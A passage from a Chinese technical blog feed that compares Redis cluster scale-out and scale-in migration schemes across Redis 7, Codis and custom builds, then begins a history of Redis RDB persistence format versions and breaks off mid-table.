7系"></a>2.2.5、Redis 7系</h3><ul><li>版本范围：7.0.0 ~ 7.0.5（写这篇文章时最新版本为 7.0.5 ，以下分析基于 7.0.5 版本）</li><li>版本特点：<ul><li>无</li></ul></li><li>扩容流程（假设从节点 A 中迁移数据到新节点 N）：<ul><li>加入需要扩容的节点 N，命令： <code>cluster meet N_ip N_port</code> ；</li><li>连接目标节点 N ，设置 Slot 状态为 <code>importing</code> ，命令：<code>cluster setslot $slotid importing $sourceNodeID</code> ；</li><li>连接源节点 A ，设置 Slot 状态为 <code>migrating</code> ，命令： <code>cluster setslot $slotid migrating $targetNodeID</code> ；</li><li>从源节点 A 获取待迁移数据，命令： <code>cluster getkeysinslot $slotid $count</code> ；</li><li>在源节点 A 上执行同步阻塞的数据迁移，支持两种不同的命令格式： <ul><li><code>migrate $targetIP $targetPort $key $dbid $timeout [copy|replace|auth $password|auth2 $username $password]</code> ；</li><li><code>migrate $targetIP $targetPort &quot;&quot; $dbid $timeout [copy|replace|auth $password|auth2 $username $password] keys $key1 $key2 ... $keyN</code> ；</li></ul></li><li>将源节点 A 上的所有对应 Slot 的数据全部迁移到目标节点 N 之后，设置迁移 Slot 的归属节点信息，理论上需要连接源节点和目标节点来设置，命令：<code>cluster setslot $slotid node $targetNodeID</code> ；</li></ul></li><li>缩容流程（假设从节点 N 中迁移数据到节点 A）：<ul><li>连接目标节点 A ，设置 Slot 状态为 <code>importing</code> ，命令：<code>cluster setslot $slotid importing $sourceNodeID</code> ；</li><li>连接源节点 N ，设置 Slot 状态为 <code>migrating</code> ，命令： <code>cluster setslot $slotid migrating $targetNodeID</code> ；</li><li>从源节点 N 获取待迁移数据，命令： <code>cluster getkeysinslot $slotid $count</code> ；</li><li>在源节点 N 上执行同步阻塞的数据迁移，支持两种不同的命令格式： <ul><li><code>migrate $targetIP $targetPort $key $dbid $timeout [copy|replace|auth $password|auth2 $username $password]</code> ；</li><li><code>migrate $targetIP $targetPort &quot;&quot; $dbid $timeout [copy|replace|auth $password|auth2 $username $password] keys $key1 $key2 ... $keyN</code> ；</li></ul></li><li>将源节点 N 上的所有对应 Slot 的数据全部迁移到目标节点 A 之后，设置迁移 Slot 的归属节点信息，理论上需要连接源节点和目标节点来设置，命令：<code>cluster setslot $slotid node $targetNodeID</code> ；</li><li>通知集群所有节点要删除的节点信息，命令： <code>cluster forget $delNodeID</code> ；</li></ul></li></ul><h1 id="三、奇思妙想"><a href="#三、奇思妙想" class="headerlink" title="三、奇思妙想"></a>三、奇思妙想</h1><h2 id="3-1、Redis-异步扩缩容方案"><a href="#3-1、Redis-异步扩缩容方案" class="headerlink" title="3.1、Redis 异步扩缩容方案"></a>3.1、Redis 异步扩缩容方案</h2><ul><li><p>Redis版本：基于社区版本 6.0.0 版本改造 ，<a href="https://github.com/spinlock/redis/tree/dev_v2">版本地址</a></p></li><li><p>方案特点：</p><ul><li>Codis 作者（王乃峥）提供的迁移方案；</li><li>基于异步线程实现的异步扩缩容方案；</li><li>利用 RedisCluster 中提供的 Slot 和 Keys 的映射关系，与 Redis 6系版本中实现一致；</li></ul></li><li><p>异步扩容流程（假设从节点 A 中迁移数据到新节点 N ）：</p><ul><li>加入需要扩容的节点 N，命令： <code>cluster meet N_ip N_port</code> ；</li><li>连接目标节点 N ，设置 Slot 状态为 <code>importing</code> ，命令：<code>cluster setslot $slotid importing $sourceNodeID</code> ；</li><li>连接源节点 A ，设置 Slot 状态为 <code>migrating</code> ，命令： <code>cluster setslot $slotid migrating $targetNodeID</code> ；</li><li>从源节点 A 获取待迁移数据，命令： <code>cluster getkeysinslot $slotid $count</code> ；</li><li>在源节点 A 上执行异步的数据迁移（必须带有 async 参数），支持两种不同的命令格式： <ul><li><code>migrate $targetIP $targetPort $key $dbid $timeout [copy|replace|async|auth $password|auth2 $username $password]</code> ；</li><li><code>migrate $targetIP $targetPort &quot;&quot; $dbid $timeout [copy|replace|async|auth $password|auth2 $username $password] keys $key1 $key2 ... $keyN</code> ；</li></ul></li><li>源节点 A 将迁移任务添加到异步队列中，等待迁移线程处理异步任务，同时将当前客户端 Block ；</li><li>源节点 A 中的迁移线程将数据异步迁移到目标节点 N 中，等待执行结果；</li><li>目标节点 N 接收到迁移命令，将其加入异步队列中，等待迁移线程处理异步任务，同时将当前客户端 Block ；</li><li>目标节点 N 处理完成命令后，给源节点 A 回复迁移结果，然后取消 Block 迁移客户端；</li><li>源节点 A 接收到迁移结果后，取消 Block 客户端，给发起迁移的客户端回复执行结果，完成迁移；</li></ul></li><li><p>异步缩容流程（假设从节点 N 中迁移数据到节点 A）：</p><ul><li><p>连接目标节点 A ，设置 Slot 状态为 <code>importing</code> ，命令：<code>cluster setslot $slotid importing $sourceNodeID</code> ；</p></li><li><p>连接源节点 N ，设置 Slot 状态为 <code>migrating</code> ，命令： <code>cluster setslot $slotid migrating $targetNodeID</code> ；</p></li><li><p>从源节点 N 获取待迁移数据，命令： <code>cluster getkeysinslot $slotid $count</code> ；</p></li><li><p>在源节点 N 上执行异步的数据迁移（必须带有 async 参数），支持两种不同的命令格式： </p><ul><li><code>migrate $targetIP $targetPort $key $dbid $timeout [copy|replace|async|auth $password|auth2 $username $password]</code> ；</li><li><code>migrate $targetIP $targetPort &quot;&quot; $dbid $timeout [copy|replace|async|auth $password|auth2 $username $password] keys $key1 $key2 ... $keyN</code> ；</li></ul></li><li><p>源节点 N 将迁移任务添加到异步队列中，等待迁移线程处理异步任务，同时将当前客户端 Block ；</p></li><li><p>源节点 N 中的迁移线程将数据异步迁移到目标节点 A 中，等待执行结果；</p></li><li><p>目标节点 A 接收到迁移命令，将其加入异步队列中，等待迁移线程处理异步任务，同时将当前客户端 Block ；</p></li><li><p>目标节点 A 处理完成命令后，给源节点 N 回复迁移结果，然后取消 Block 迁移客户端；</p></li><li><p>源节点 A 接收到迁移结果后，取消 Block 客户端，给发起迁移的客户端回复执行结果；</p></li><li><p>将源节点 N 上的所有对应 Slot 的数据全部迁移到目标节点 A 之后，设置迁移 Slot 的归属节点信息，理论上需要连接源节点和目标节点来设置，命令：<code>cluster setslot $slotid node $targetNodeID</code> ；</p></li><li><p>通知集群所有节点要删除的节点信息，命令： <code>cluster forget $delNodeID</code> ；</p></li></ul></li></ul><p><img src="/assets/images/redis-resharding-async-talk.png" alt="基于异步线程的迁移流程图" loading="lazy"></p><ul><li>异步扩&#x2F;缩容状态机：<ul><li>PROCESS_STATE_NONE ： </li><li>PROCESS_STATE_DONE ： </li><li>PROCESS_STATE_QUEUED ：</li></ul></li></ul><h2 id="3-2、Codis-扩缩容方案"><a href="#3-2、Codis-扩缩容方案" class="headerlink" title="3.2、Codis 扩缩容方案"></a>3.2、Codis 扩缩容方案</h2><p>Codis 是豌豆荚推出的比较早期的一款 Redis 的集群方案，它不同于 RedisCluster 的去中心化的部署架构，它包含了元信息管控组件，Proxy ，以及 Redis 等。因此 Codis 实现的 Redis 扩缩容的方案业余社区的方案不同，这里主要介绍了 Codis 在扩缩容上实现的两种方案：同步和异步的方案。</p><h3 id="3-2-1、Codis-同步扩缩容方案"><a href="#3-2-1、Codis-同步扩缩容方案" class="headerlink" title="3.2.1、Codis 同步扩缩容方案"></a>3.2.1、Codis 同步扩缩容方案</h3><ul><li><p>Redis版本：2.8.21 ， 3.2.4 ， 3.2.8 ， 3.2.11 （均为 Codis 定制版，以下分析基于 3.2.11 ）</p></li><li><p>方案特点：</p><ul><li>同步阻塞的扩缩容方案，会影响业务的正常读写请求；</li></ul></li><li><p>Slot&#x2F;Key映射关系：</p><ul><li>db-&gt;hash_slots 中记录 Slot 和 Keys 的映射关系，字典中 Key&#x2F;Value 的具体内容为：<ul><li>Key ： 实际的 Key 的值；</li><li>Vlaue ： 实际 Key 的 CRC32 的值；</li></ul></li><li>db-&gt;tagged_keys 中记录带有 Hashtag 的 Key 和其 CRC32 值的映射关系，其中具体的存储格式为：<ul><li>Score ： 对应 Key 的 CRC32 值；</li><li>Obj ：对应 Key 的值；</li></ul></li></ul></li><li><p>同步迁移命令：</p><ul><li><p><code>slotsmgrtslot $targetIP $targetPort $timeout $slotID</code> ：获取特定 Slot 的所有key，依次序列化单个 KV 并通过 slotsrestore 命令同步阻塞发送给目标节点；</p></li><li><p><code>slotsmgrttagslot $targetIP $targetPort $timeout $slotID</code> ：</p></li></ul></li><li><p>数据结构：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// redisDb中存储Slot和Keys的映射关系</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">redisDb</span> &#123;</span><br>    ...<br><br>    dict *hash_slots[<span class="hljs-number">1024</span>];         <span class="hljs-comment">// 额外的字典记录Slot和Keys的映射关系</span><br>    <span class="hljs-type">int</span> hash_slots_rehashing;       <span class="hljs-comment">// 标记hash_slots字典是否处于Rehashing状态</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zskiplist</span> *<span class="hljs-title">tagged_keys</span>;</span>  <span class="hljs-comment">// 记录Key的CRC32值和Key的映射关系</span><br><br>    ...<br><br>&#125; redisDb;<br></code></pre></td></tr></table></figure></li><li><p>扩&#x2F;缩容流程（假设从节点 A 迁移数据到节点 N ）：</p><ul><li>连接源节点（节点 A ），执行特定的数据迁移命令；</li><li>源节点（节点 A ）依次序列化待迁移的 KV 数据并封装成 slotrestore 命令，同步阻塞的将数据迁移到目标节点（节点 N ）；</li><li>目标节点（节点 N ）同步执行完成 slotrestore 命令后，返回执行结果给源节点（节点 A ）；</li></ul></li></ul><p><img src="/assets/images/redis-resharding-codis-sync-talk.png" alt="Codis同步扩缩容的流程" loading="lazy"></p><h3 id="3-2-2、Codis-异步扩缩容方案"><a href="#3-2-2、Codis-异步扩缩容方案" class="headerlink" title="3.2.2、Codis 异步扩缩容方案"></a>3.2.2、Codis 异步扩缩容方案</h3><ul><li><p>Redis版本：3.2.8 ， 3.2.11 （均为 Codis 定制版，以下分析基于 3.2.11 ）</p></li><li><p>方案特点：</p><ul><li>基于 Epoll 文件事件实现的异步扩缩容方案；</li><li>Codis 作者曾将该方案提交到 Redis 社区版本中（ <a href="https://github.com/redis/redis/pull/3997">Pull&#x2F;3997</a> ），后来由于方案过于复杂而被废弃；</li></ul></li><li><p>Slot&#x2F;Key映射关系：</p><ul><li>db-&gt;hash_slots 中记录 Slot 和 Keys 的映射关系，字典中 Key&#x2F;Value 的具体内容为：<ul><li>Key ： 实际的 Key 的值；</li><li>Vlaue ： 实际 Key 的 CRC32 的值；</li></ul></li><li>db-&gt;tagged_keys 中记录带有 Hashtag 的 Key 和其 CRC32 值的映射关系，其中具体的存储格式为：<ul><li>Score ： 对应 Key 的 CRC32 值；</li><li>Obj ：对应 Key 的值；</li></ul></li></ul></li><li><p>扩&#x2F;缩容流程（假设从节点 A 迁移数据到节点 N ）：</p><ul><li>连接源节点 A ，执行特定的数据迁移命令（其中包含很多自定义的参数，包括命令的最大字节，最大Bluk等）；</li><li>源节点 A 建立与目标节点 N 的连接，注册文件读写事件，并缓存该连接；</li><li>源节点 A 根据迁移命令的参数，从本地 DB 中获取特定的待迁移的 Keys ；</li><li>源节点 A 根据 Key 的特征（数据类型以及数据项的数量），按需进行序列化并异步迁移到目标节点 N ；</li><li>目标节点 N 处理部分迁移命令之后，回复源节点 A 迁移的执行结果；</li><li>源节点 A 在收到执行结果后，又会主动将剩余未迁移的 Keys （包括之前拆分的 Keys ）迁移到目标节点 N ，直到单次任务中的 Keys 全部迁移完成；</li></ul></li></ul><p><img src="/assets/images/redis-resharding-codis-async-talk.png" alt="Codis异步扩缩容的流程" loading="lazy"></p><ul><li><p>扩&#x2F;缩容过程中的数据访问：</p><ul><li>扩缩容过程中会主动迁移将要访问的 Key ，确保对应 Key 始终都是去目标节点中访问；</li></ul></li><li><p>单个KV的迁移状态机：</p><ul><li>STAGE_PREPARE ： 迁移前的初始状态；</li><li>STAGE_PAYLOAD ： 可以仅使用一个迁移命令将一个KV迁移到目标节点；</li><li>STAGE_CHUNKED ： 需要使用多个迁移命令将一个KV迁移到目标节点；</li><li>STAGE_FILLTTL ： 当使用多个迁移命令将一个KV迁移到目标节点后，按需发送一个设置过期时间的命令给目标节点；</li><li>STAGE_DONE ：迁移完成的状态；</li></ul></li></ul><p><img src="/assets/images/redis-resharding-codis-async-state.png" alt="Codis异步扩缩容方案的迁移状态机" loading="lazy"></p><h2 id="3-3、选择性复制的扩容方案"><a href="#3-3、选择性复制的扩容方案" class="headerlink" title="3.3、选择性复制的扩容方案"></a>3.3、选择性复制的扩容方案</h2><ul><li><p>Redis版本：定制版Redis（基于较老的社区版本实现）</p></li><li><p>方案特点：</p><ul><li>基于 Redis 的主从复制实现的数据扩容方案，从库选择性加载部分数据；</li><li>只能够实现成倍扩容，无法进行缩容；</li><li>需要业务进行切流；</li></ul></li><li><p>Slot&#x2F;Key映射关系：无需记录映射关系；</p></li><li><p>扩容流程（假设从分片数 1 扩容到分片数 2 ）：</p><ul><li>原始的一个分片添加两个从库，进行主从的数据同步；</li><li>这两个新添加的从库在加载来自主库的数据时，选择性的过滤加载部分数据，使每个从库中的数据都是主库中数据的一半；</li><li>等待数据同步完成之后，将这两个新添加的从库各自提升为主库，使其成为新的两个分片的主库；</li><li>业务对业务流量进行切换，使其路由到新的两个分片中，完成扩容；</li></ul></li></ul><p><img src="/assets/images/redis-resharding-partial-repl-talk.png" alt="选择性复制的扩容流程" loading="lazy"></p><h2 id="3-4、Slot扩缩容方案"><a href="#3-4、Slot扩缩容方案" class="headerlink" title="3.4、Slot扩缩容方案"></a>3.4、Slot扩缩容方案</h2><h3 id="3-4-1、Slot串行扩缩容方案"><a href="#3-4-1、Slot串行扩缩容方案" class="headerlink" title="3.4.1、Slot串行扩缩容方案"></a>3.4.1、Slot串行扩缩容方案</h3><ul><li><p>Redis版本：定制版Redis</p></li><li><p>方案特点：</p><ul><li>每个 Redis 实例内部维护了一个 16384 个 DB 的数据，其中每一个 DB 代表着一个 Slot 的数据集；</li><li>扩缩容操作的是整个 DB 的数据集；</li><li>使用异步线程的方式，按照 DB（Slot） 依次进行数据的迁移；</li><li>迁移期间需要按照 DB（Slot） 进行禁写；</li></ul></li><li><p>Slot&#x2F;Key映射关系：一个 DB 中的数据集全部属于一个 Slot ；</p></li><li><p>扩&#x2F;缩容流程（假设从节点 A 迁移数据到节点 N ）：</p><ul><li>源节点 A 接收到数据迁移命令；</li><li>源节点 A 将对应 DB（Slot） 对应的数据集禁写，并创建异步的迁移任务；</li><li>源节点 A 中的异步迁移线程持久化对应 DB（Slot） 的数据集，并将其迁移到目标节点 N ；</li><li>源节点 A 中的异步迁移线程等待目标节点 N 的回复消息，然后按需清除本地 DB（Slot）的数据；</li><li>源节点 A 中的主线程取消对应 DB（Slot）的禁写，结束迁移；</li></ul></li></ul><p><img src="/assets/images/redis-resharding-slot-serial-talk.png" alt="Slot串行扩缩容流程" loading="lazy"></p><h3 id="3-4-2、Slot并行扩缩容方案"><a href="#3-4-2、Slot并行扩缩容方案" class="headerlink" title="3.4.2、Slot并行扩缩容方案"></a>3.4.2、Slot并行扩缩容方案</h3><ul><li><p>Redis版本：定制版Redis</p></li><li><p>方案特点：</p><ul><li>子进程迁移存量数据，父进程迁移增量数据；</li><li>父进程会进行阻写，但是阻写窗口比较小；</li></ul></li><li><p>Slot&#x2F;Key映射关系：无需记录；</p></li><li><p>扩&#x2F;缩容流程（假设从节点 A 迁移数据到节点 N ）：</p><ul><li>源节点 A 接收到数据迁移命令；</li><li>源节点 A 创建子进程来迁移存量的数据，同时父进程记录期间待迁移 Slots 的变更操作；</li><li>源节点 A 等待子进程迁移完成后，父进程将期间记录的增量变更操作迁移到目标节点 N ；</li><li>源节点 A 等待增量迁移的数据处于特定阈值内后，将禁止新的写入；</li><li>等待管控节点进行路由拓扑的变更，迁移完成；</li></ul></li></ul><p><img src="/assets/images/redis-resharding-slot-parallel-talk.png" alt="Slot并行扩缩容流程" loading="lazy"></p><h2 id="3-5、旁路扩缩容方案"><a href="#3-5、旁路扩缩容方案" class="headerlink" title="3.5、旁路扩缩容方案"></a>3.5、旁路扩缩容方案</h2><ul><li><p>Redis版本：定制版Redis（不考虑高级功能的情况下全版本Redis都支持）</p></li><li><p>方案特点：</p><ul><li>旁路组件拉取全部数据并进行解析，过滤和转发来实现扩缩容；</li><li>高级功能指的是一些有助于高效迁移的定制版功能；</li></ul></li><li><p>Slot&#x2F;Key映射关系：无需记录；</p></li><li><p>扩&#x2F;缩容流程（假设从节点 A 迁移数据到节点 N ，管控组件为 M ，迁移组件为 X ）：</p><ul><li>管控组件 M 向旁路迁移组件 X 发起扩缩容任务；</li><li>旁路迁移组件 X 伪造自己为 Redis 的一个从库，向源节点 A 发起全量数据同步和增量数据同步；<ul><li>拉取数据的优化（高级）版本：仅拉取待迁移的特定的 Slots 数据；</li></ul></li><li>旁路迁移组件 X 在本地解析&#x2F;过滤拉取的全量和增量数据，并将其转发到目标节点 N ；</li><li>旁路迁移组件 X 等待增量的迁移命令数处于特定阈值内后，通知管控组件 M 进行拓扑变更；</li><li>管控组件 M 拓扑变更完成后，流量路由到目标节点 N ，同时旁路迁移组件会同步完成后续增量的数据；</li><li>旁路迁移组件执行数据清理工作，完成扩缩容；</li></ul></li></ul><p><img src="/assets/images/redis-resharding-bypass-talk.png" alt="旁路扩缩容流程" loading="lazy"></p><h1 id="四、思考"><a href="#四、思考" class="headerlink" title="四、思考"></a>四、思考</h1><h2 id="4-1、RedisCluster-演进方向的思考"><a href="#4-1、RedisCluster-演进方向的思考" class="headerlink" title="4.1、RedisCluster 演进方向的思考"></a>4.1、RedisCluster 演进方向的思考</h2><p>RedisCluster 中的扩缩容功能自从 Redis 3.0.0 支持以来，架构上基本上没有特别大的变动，不过社区中谈论的声音却从未停止过，比如早期版本中 Codis 作者提交的关于异步数据迁移方案  <a href="https://github.com/redis/redis/pull/3997">Pull&#x2F;3997</a>   ，最近社区关于 Slot 迁移原子性以及可靠性的 <a href="https://github.com/redis/redis/pull/10517">Pull&#x2F;10517</a> ，以及社区对于 <a href="https://github.com/redis/redis/issues/8948">Redis Cluster v2版本的规划与思考</a> 等。</p><h2 id="4-2、Redis扩缩容的可能性"><a href="#4-2、Redis扩缩容的可能性" class="headerlink" title="4.2、Redis扩缩容的可能性"></a>4.2、Redis扩缩容的可能性</h2><ul><li>无数据变动的扩缩容方案：<ul><li>很多 Redis 使用者主要还是用于缓存的业务场景，因此有很多场景下及时数据出现丢失也不会对业务产生多么严重的影响，只不过我们需要控制数据丢失的百分比，因此基于这点其实我们可以实现一种不迁移数据的渐进式扩缩容方案，从而能够快速实现对资源的扩缩容，以满足极端场景下业务扩缩容的需求。</li></ul></li></ul><h1 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h1><ul><li><a href="https://cloud.tencent.com/developer/article/1604780">Redis Cluster集群扩容缩容原理及实战</a></li><li><a href="https://time.geekbang.org/qconplus/detail/100110471">百度 Redis 内核深度剖析（极客时间出品）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
          <category> 演进史 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis持久化演进史与奇思妙想</title>
      <link href="/2022/12/04/redis-persistence/"/>
      <url>/2022/12/04/redis-persistence/</url>
      
        <content type="html"><![CDATA[<p>目前 Redis 主要支持两种持久化的方式：RDB 和 AOF 。这两者在 Redis 的演进过程中也发生了很多有意思的变化。RDB 的数据格式也已经进行了十次版本迭代，AOF 从最初的 Rewrite 到 Redis 7.0.0 的 Multi-Part-AOF 也发生了很多的变化，这里将对每个版本进行详细的剖析，学习 Redis 的持久化演进历史。这篇文章主要借鉴于 <a href="https://mp.weixin.qq.com/s/9pzNddluP93Wt62cYZK5uw">Redis 持久化机制演进与百度智能云的实践</a> ，同时按照自己的理解绘制了一些示意图。</p><h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Redis 支持两种持久化的方式：RDB 和 AOF 。</p><h1 id="二、Redis-RDB-持久化演进史"><a href="#二、Redis-RDB-持久化演进史" class="headerlink" title="二、Redis RDB 持久化演进史"></a>二、Redis RDB 持久化演进史</h1><h2 id="2-1、持久化的数据版本演进"><a href="#2-1、持久化的数据版本演进" class="headerlink" title="2.1、持久化的数据版本演进"></a>2.1、持久化的数据版本演进</h2><h3 id="2-1-1、版本一"><a href="#2-1-1、版本一" class="headerlink" title="2.1.1、版本一"></a>2.1.1、版本一</h3><ul><li><p>版本范围：2.0.0 ～ 2.2.15 （以下分析基于 2.2.15 版本）</p></li><li><p>RDB版本号：0001</p></li><li><p>版本特点：</p><ul><li>首次支持对五种数据类型数据的持久化；</li></ul></li><li><p>持久化数据内容：</p><ul><li><p>标记头尾信息；</p></li><li><p>多 DB 信息（ REDIS_SELECTDB ）；</p></li><li><p>过期时间属性（单位秒， REDIS_EXPIRETIME ）；</p></li><li><p>不同的数据类型及编码：</p><table><thead><tr><th align="center">数据类型</th><th align="center">内存中编码类型</th><th align="center">RDB 文件中编码</th></tr></thead><tbody><tr><td align="center">REDIS_STRING （0）</td><td align="center">REDIS_ENCODING_RAW</td><td align="center">REDIS_STRING （0）</td></tr><tr><td align="center">REDIS_STRING （0）</td><td align="center">REDIS_ENCODING_INT</td><td align="center">REDIS_STRING （0）</td></tr><tr><td align="center">REDIS_LIST （1）</td><td align="center">REDIS_ENCODING_ZIPLIST</td><td align="center">REDIS_LIST （1）</td></tr><tr><td align="center">REDIS_LIST （1）</td><td align="center">REDIS_ENCODING_LINKEDLIST</td><td align="center">REDIS_LIST （1）</td></tr><tr><td align="center">REDIS_SET （2）</td><td align="center">REDIS_ENCODING_HT</td><td align="center">REDIS_SET （2）</td></tr><tr><td align="center">REDIS_SET （2）</td><td align="center">REDIS_ENCODING_INTSET</td><td align="center">REDIS_SET （2）</td></tr><tr><td align="center">REDIS_ZSET （3）</td><td align="center">REDIS_ENCODING_HT</td><td align="center">REDIS_ZSET （3）</td></tr><tr><td align="center">REDIS_HASH （4）</td><td align="center">REDIS_ENCODING_ZIPMAP</td><td align="center">REDIS_HASH （4）</td></tr><tr><td align="center">REDIS_HASH （4）</td><td align="center">REDIS_ENCODING_HT</td><td align="center">REDIS_HASH （4）</td></tr><tr><td align="center">REDIS_VMPOINTER （8）</td><td align="center"></td><td align="center"></td></tr></tbody></table></li><li><p>从硬盘上加载交换后的数据（基于 server.vm_enabled 关联的特性）；</p></li></ul></li></ul><h3 id="2-1-2、版本二"><a href="#2-1-2、版本二" class="headerlink" title="2.1.2、版本二"></a>2.1.2、版本二</h3><ul><li><p>版本范围：2.4.0 ～ 2.4.18 （以下分析基于 2.4.18 版本）</p></li><li><p>RDB版本号：0002</p></li><li><p>版本特点：</p><ul><li>对不同数据类型的不同编码的持久化数据进行了区分；</li><li>ZSET 数据类型的编码优化： 由 HASH 转换为 ZIPLIST 和 SKIPLIST ；</li></ul></li><li><p>持久化数据内容：</p><ul><li><p>标记头尾信息；</p></li><li><p>多 DB 信息（ REDIS_SELECTDB ）；</p></li><li><p>过期时间属性（单位秒， REDIS_EXPIRETIME ）；</p></li><li><p>不同的数据类型及编码：</p><table><thead><tr><th align="center">数据类型</th><th align="center">内存中编码类型</th><th align="center">RDB 文件中编码</th></tr></thead><tbody><tr><td align="center">REDIS_STRING （0）</td><td align="center">REDIS_ENCODING_RAW （0）</td><td align="center">REDIS_STRING （0）</td></tr><tr><td align="center">REDIS_STRING （0）</td><td align="center">REDIS_ENCODING_INT （1）</td><td align="center">REDIS_STRING （0）</td></tr><tr><td align="center">REDIS_LIST （1）</td><td align="center">REDIS_ENCODING_ZIPLIST （5）</td><td align="center">REDIS_LIST_ZIPLIST （10）</td></tr><tr><td align="center">REDIS_LIST （1）</td><td align="center">REDIS_ENCODING_LINKEDLIST （4）</td><td align="center">REDIS_LIST （1）</td></tr><tr><td align="center">REDIS_SET （2）</td><td align="center">REDIS_ENCODING_HT （2）</td><td align="center">REDIS_SET （2）</td></tr><tr><td align="center">REDIS_SET （2）</td><td align="center">REDIS_ENCODING_INTSET （6）</td><td align="center">REDIS_SET_INTSET （11）</td></tr><tr><td align="center">REDIS_ZSET （3）</td><td align="center">REDIS_ENCODING_ZIPLIST （5）</td><td align="center">REDIS_ZSET_ZIPLIST （12）</td></tr><tr><td align="center">REDIS_ZSET （3）</td><td align="center">REDIS_ENCODING_SKIPLIST （7）</td><td align="center">REDIS_ZSET （3）</td></tr><tr><td align="center">REDIS_HASH （4）</td><td align="center">REDIS_ENCODING_ZIPMAP （3）</td><td align="center">REDIS_HASH_ZIPMAP （9）</td></tr><tr><td align="center">REDIS_HASH （4）</td><td align="center">REDIS_ENCODING_HT （2）</td><td align="center">REDIS_HASH （4）</td></tr><tr><td align="center">REDIS_VMPOINTER （8）</td><td align="center"></td><td align="center"></td></tr></tbody></table></li><li><p>从硬盘上加载交换后的数据（基于 server.vm_enabled 关联的特性）；</p></li></ul></li></ul><h3 id="2-1-3、版本三"><a href="#2-1-3、版本三" class="headerlink" title="2.1.3、版本三"></a>2.1.3、版本三</h3><ul><li><p>版本范围：2.4.0 ～ 2.5.1（当前不存在 2.5.x 版本，这其实是 2.6.0 的候选版本，2.5.1 版本的最新 <a href="https://github.com/redis/redis/commit/7551f2a0b19e5cf444bf6fed3b8ed5b2c936a228">Commit</a>  ）</p></li><li><p>RDB版本号：0003</p></li><li><p>版本特点：</p><ul><li>数据过期时间由秒调整为毫秒；</li><li>HASH 数据类型的编码优化： 由 ZIPMAP 和 HASH 转换为 ZIPLIST 和 HASH ；</li><li>移除了从硬盘上加载交换后的数据的逻辑（基于 server.vm_enabled 关联的特性）；</li></ul></li><li><p>持久化数据内容：</p><ul><li><p>标记头尾信息；</p></li><li><p>多 DB 信息（ REDIS_RDB_OPCODE_SELECTDB ）；</p></li><li><p>过期时间属性（单位毫秒， REDIS_RDB_OPCODE_EXPIRETIME_MS ）；</p></li><li><p>不同的数据类型及编码：</p><table><thead><tr><th align="center">数据类型</th><th align="center">内存中编码类型</th><th align="center">RDB 文件中编码</th></tr></thead><tbody><tr><td align="center">REDIS_STRING （0）</td><td align="center">REDIS_ENCODING_RAW （0）</td><td align="center">REDIS_RDB_TYPE_STRING （0）</td></tr><tr><td align="center">REDIS_STRING （0）</td><td align="center">REDIS_ENCODING_INT （1）</td><td align="center">REDIS_RDB_TYPE_STRING （0）</td></tr><tr><td align="center">REDIS_LIST （1）</td><td align="center">REDIS_ENCODING_ZIPLIST （5）</td><td align="center">REDIS_RDB_TYPE_LIST_ZIPLIST （10）</td></tr><tr><td align="center">REDIS_LIST （1）</td><td align="center">REDIS_ENCODING_LINKEDLIST （4）</td><td align="center">REDIS_RDB_TYPE_LIST （1）</td></tr><tr><td align="center">REDIS_SET （2）</td><td align="center">REDIS_ENCODING_INTSET （6）</td><td align="center">REDIS_RDB_TYPE_SET_INTSET （11）</td></tr><tr><td align="center">REDIS_SET （2）</td><td align="center">REDIS_ENCODING_HT （2）</td><td align="center">REDIS_RDB_TYPE_SET （2）</td></tr><tr><td align="center">REDIS_ZSET （3）</td><td align="center">REDIS_ENCODING_ZIPLIST （5）</td><td align="center">REDIS_RDB_TYPE_ZSET_ZIPLIST （12）</td></tr><tr><td align="center">REDIS_ZSET （3）</td><td align="center">REDIS_ENCODING_SKIPLIST （7）</td><td align="center">REDIS_RDB_TYPE_ZSET （3）</td></tr><tr><td align="center">REDIS_HASH （4）</td><td align="center">REDIS_ENCODING_ZIPLIST （5）</td><td align="center">REDIS_RDB_TYPE_HASH_ZIPLIST （13）</td></tr><tr><td align="center">REDIS_HASH （4）</td><td align="center">REDIS_ENCODING_HT （2）</td><td align="center">REDIS_RDB_TYPE_HASH （4）</td></tr></tbody></table></li></ul></li></ul><h3 id="2-1-4、版本四"><a href="#2-1-4、版本四" class="headerlink" title="2.1.4、版本四"></a>2.1.4、版本四</h3><ul><li><p>版本范围：2.5.2 ～ 2.5.5（当前不存在 2.5.x 版本，这其实是 2.6.0 的候选版本，2.5.5 版本的最新 <a href="https://github.com/redis/redis/commit/1bcb45d1187bbe601b9e14eb5d4cdbd4b5ae3961">Commit</a>  ）</p></li><li><p>RDB版本号：0004</p></li><li><p>版本特点：</p><ul><li>无变动；</li></ul></li><li><p>持久化数据内容：</p><ul><li><p>标记头尾信息；</p></li><li><p>多 DB 信息（ REDIS_RDB_OPCODE_SELECTDB ）；</p></li><li><p>过期时间属性（单位毫秒， REDIS_RDB_OPCODE_EXPIRETIME_MS ）；</p></li><li><p>不同的数据类型及编码：</p><table><thead><tr><th align="center">数据类型</th><th align="center">内存中编码类型</th><th align="center">RDB 文件中编码</th></tr></thead><tbody><tr><td align="center">REDIS_STRING （0）</td><td align="center">REDIS_ENCODING_RAW （0）</td><td align="center">REDIS_RDB_TYPE_STRING （0）</td></tr><tr><td align="center">REDIS_STRING（0）</td><td align="center">REDIS_ENCODING_INT （1）</td><td align="center">REDIS_RDB_TYPE_STRING （0）</td></tr><tr><td align="center">REDIS_LIST （1）</td><td align="center">REDIS_ENCODING_ZIPLIST （5）</td><td align="center">REDIS_RDB_TYPE_LIST_ZIPLIST （10）</td></tr><tr><td align="center">REDIS_LIST （1）</td><td align="center">REDIS_ENCODING_LINKEDLIST （4）</td><td align="center">REDIS_RDB_TYPE_LIST （1）</td></tr><tr><td align="center">REDIS_SET （2）</td><td align="center">REDIS_ENCODING_INTSET （6）</td><td align="center">REDIS_RDB_TYPE_SET_INTSET （11）</td></tr><tr><td align="center">REDIS_SET （2）</td><td align="center">REDIS_ENCODING_HT 